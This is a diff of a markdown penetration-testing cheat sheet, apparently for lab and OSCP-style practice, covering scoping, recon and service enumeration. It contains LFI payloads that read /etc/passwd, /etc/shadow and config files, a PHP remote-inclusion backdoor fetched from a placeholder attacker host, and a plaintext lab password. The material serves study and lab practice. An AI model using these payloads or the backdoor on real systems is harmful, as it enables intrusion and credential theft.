@@ -60,40 +60,33 @@ i use kali linux by offensive security. you can either use it on a virtualizatio
 
 [2. guide to secure kali further](https://thehacktoday.com/how-to-protect-yourself-while-hacking-in-kali-linux/)
 
-## the methodology i follow
+
+
+
+**## the methodology i follow**
 
 
 - initial scoping
 
 - recon 
 
-- more recon
-
 - enumerate all attack surfaces
 
-- research the attack surfaces
+- search/create an exploit
 
-- search for pre-existing exploits for the services
+- run exploit
 
-- create a personalised exploit
+- get shell
 
-- exploit
+- upgrade shell
 
-- get a shell
-
-- get a fully upgraded shell
-
-- enumerate the target user/host
+- enumerate the target
 
 - escalate privileges
 
 - gain root access
 
-- submit flag/proof of concept
-
 - write a report
-
-- chill the fuvk out
 
 
 ## scoping
@@ -101,9 +94,7 @@ clearly understand which targets your have permission to scan/attack, do not bre
 
 ## recon
 
-the most important step of the methodology.
-the better the recon, the larger the discovered attack surface, the higher the probability of finding a vulnerability and exploiting it.
-
+recon wide to gather information on as many potential attack surfaces as possible
 
 ### 1. masscan
 
@@ -117,51 +108,148 @@ masscan -i tun0 -p1-65535 --rate=1000 IP
 this handy little tool lets you see which ports are open on the target along with other information about the target
 
 ```
-nmap -sTV -v IP 
+nmap -sTV -v -p- IP
+sudo nmap -sU -v IP
 
-
-locate *.nse | grep <service>
-
-sudo nmap -sS -sV --script=default,vuln -p- -T5 IP
-
-nmap -p 139,445 --script=$scriptname IP
-
-nmap -p 139,445 --script=smb-vuln* IP -v
-
-nmap --script smtp-commands,smtp-enum-users,smtp-vuln-cve2010-4344,smtp-vuln-cve2011-1720,smtp-vuln-cve2011-1764 -p 25 IP
-
-nmap -p 389 --script ldap-search IP
  ``` 
-
-[list of useful ports](https://sushant747.gitbooks.io/total-oscp-guide/content/list_of_common_ports.html)
-
-### 3. nikto 
-
-heavy scanner that i seldom use due to massive data usage
-```
-nikto -host IP -port PORT
-```
-### 4. dirbuster
-
-GUI, useful to check out directories on the target's port 80, finds directories hidden from plainview by bruteforcing it
-
-### 5. wfuzz
-
-CLI, useful to fuzz directories
-```
-wfuzz -c -w /usr/share/seclists/Discovery/Web-Content/common.txt --hc 404,403 -u "http://IP/FUZZ.txt" -t 100
-
-wfuzz -c -z range, 1-65535 http://IP/url.php?path=http://localhost:FUZZ
-```
-### 6. enum4linux
-
-no shit, helps enumerate linux related services/targets
+ 
+ ### 3. nmapAutomater
+ 
+a useful script to automate the scanning process
 
 ```
-enum4inux -a IP
+ ./nmapAutomater.sh IP All
+ ./nmapAutomater.sh IP Vulns
+ ./nmapAutomater.sh IP Quick
+ ./nmapAutomater.sh IP Full
 ```
 
-### 7.
+shoutout to @21y4d for this
+
+[check it out on github here](https://github.com/21y4d/nmapAutomator/blob/master/nmapAutomator.sh)
+
+## enumerate 
+
+upgrade searchsploit 
+
+```
+searchsploit -u
+```
+search for exploits 
+
+```
+searchsploit <service>
+
+google site:exploitdb <service version>
+google service version exploit
+```
+
+### 1. HTTP  80, 8000, 8080
+
+```
+nikto -h IP
+curl -i http(s)://IP/robots.txt
+wfuzz -c -w /usr/share/seclists/Discovery/Web-Content/common.txt --hc 404,403 -u "http://<IP>/FUZZ.txt" -t 100
+wfuzz -c -z range, 1-65535 http://10.10.10.55:60000/url.php?path=http://localhost:FUZZ
+```
+
+- fire up dirbuster with a medium wordlist
+
+- browse the site with a burpsuite proxy running
+
+- look for SQL injection parameters in GET/POST
+
+- LFI with ?file=foo parameter
+
+- /etc/passwd /etc/shadow
+
+- /var/www/html/config.php
+
+- ?page=php://filter/convert.base64-encode/resource=../config.php
+
+- ../../../../../boot.ini for version
+
+- RFI backdoor
+
+```
+- <?php include $_GET['inc']; ?>
+```
+- access backdoor with http://IP/inc.php?inc=http://YOURIP/bd.php
+
+- phpinfo()
+
+### 2. HTTPS 443
+
+- check out potential usernames in the ssl cert and the correct vhost
+- look for heartbleed vuln
+
+### 3. FTP 21
+
+- anonymous login
+
+```
+ftp IP
+anonymous:anonymous
+```
+- vulns in version
+- traverse filesystem look for password files, system configs, BOF targets, OS version
+- check upload potential
+
+### 4. SMB 139,445
+
+-check if exploitable by msf
+
+```
+enum4linux -a IP
+smbclient -L IP
+locate *.nse | grep smb
+nmap -p 139,445 --script=$scriptname $targetip
+nmap -p 139,445 --script=smb-vuln* $targetip -v
+enum4linux -a $targetip
+enum4linux -a $targetip
+smbmap -H $targetip
+smbclient \\\\10.10.10.3\\tmp
+rpcclient -U "" -N 10.10.10.3
+mount -t cifs -o user=USERNAME,sec=ntlm,dir_mode=0077 "//IP/My Share" /mnt/cifs
+smbmap -H 10.10.10.97 -u tyler -p '92g!mA8BGjOirkL%OG*&'
+nbtscan -r 10.10.10.0/24
+sudo nmap -n -v -sV -Pn -p 445 --script=smb-ls,smb-mbenum,smb-enum-shares,smb-enum-users,smb-os-discovery,smb-security-mode,smb-vuln* 10.10.10.4
+psexec to login to samba
+```
+### 4. SNMP UDP 161
+
+```
+snmp-check
+echo public > community
+echo private >> community
+echo manager >> community
+for ip in $(seq 1 254);do echo 10.11.1.$ip;done > ips
+onesixtyone -c community -i ips
+snmpwalk -c public -v1 10.10.10.10
+snmpwalk -c public -v1 10.11.1.204 1.3.6.1.4.1.77.1.2.25
+snmpwalk -c public -v1 10.11.1.204 1.3.6.1.2.1.25.4.2.1.2
+snmpwalk -c public -v1 10.11.1.204 1.3.6.1.2.1.6.13.1.3
+snmpwalk -c public -v1 10.11.1.204 1.3.6.1.2.1.25.6.3.1.2
+```
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 ### Markdown
 
